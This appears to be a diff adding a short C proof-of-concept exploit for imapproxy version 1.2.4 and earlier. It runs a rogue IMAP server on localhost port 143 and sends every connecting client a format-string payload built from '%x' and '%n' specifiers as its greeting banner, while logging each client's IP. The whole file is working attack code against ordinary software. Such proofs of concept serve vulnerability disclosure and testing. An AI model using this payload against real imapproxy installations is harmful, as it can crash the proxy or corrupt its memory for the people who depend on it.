@@ -1,0 +1,43 @@
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+#define BANNER "AAAAAAAAAA%x%x%x%x%x%n%n%n\r\n\r\n"
+
+int main ( int argc, char *argv[] )
+{
+struct sockaddr_in addr, cl_addr;
+int sock, cl_sock, addr_size;
+char *Iaddr;
+socklen_t l;
+
+printf("Imapproxy <= 1.2.4 PoC Exploit\n");
+
+sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+
+addr.sin_family = AF_INET;
+addr.sin_port = htons(143);
+addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+bind(sock, (struct sockaddr*)&addr, sizeof(addr));
+listen(sock, 5);
+
+addr_size = sizeof(addr);
+
+while (1) 
+{
+	cl_sock = accept(sock, (struct sockaddr*)&cl_addr, &l);
+	Iaddr = inet_ntoa(cl_addr.sin_addr);
+	send(cl_sock, BANNER, strlen(BANNER), 0);
+	printf("IP: %s\n", Iaddr);
+}
+
+return 0;
+
+}
+
+
